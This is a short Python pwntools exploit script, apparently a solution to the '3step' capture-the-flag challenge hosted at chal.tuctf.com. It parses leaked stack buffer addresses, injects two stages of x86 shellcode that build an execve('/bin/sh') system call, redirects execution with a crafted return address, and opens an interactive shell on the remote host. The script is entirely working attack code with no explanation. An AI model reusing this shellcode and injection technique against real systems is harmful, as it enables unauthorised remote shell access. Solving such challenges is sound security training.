#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 0
# context(log_level="debug", arch="i386", os="linux")
if debug == 1:
    p = process('./3step')
else:
    p = remote('chal.tuctf.com', 30504)

# gdb.attach(p, "b *$rebase(0x12B2)\nc")
p.recvuntil('Try out complimentary snacks\n')
addr_buf1 = int(p.recv(10), 16)
p.recv(1)
addr_buf = int(p.recv(10), 16)
success('addr_buf1 = ' + hex(addr_buf1))
success('addr_buf  = ' + hex(addr_buf))
pd = asm('''
         xor edx, edx;
         push edx;
         xor ecx, ecx;
         mov eax, 0x0B;
         mov ebx, {}
         jmp ebx;
         '''.format(hex(addr_buf))
         )
info(len(pd))
p.sendafter('Step 1: ', pd)
pd = asm('''
         push 0x68732f;
         push 0x6e69622f;
         mov ebx, esp;
         int 0x80;
         ''')
info(len(pd))
p.sendafter('Step 2: ', pd)
p.sendafter('Step 3: ', p32(addr_buf1))
p.interactive()
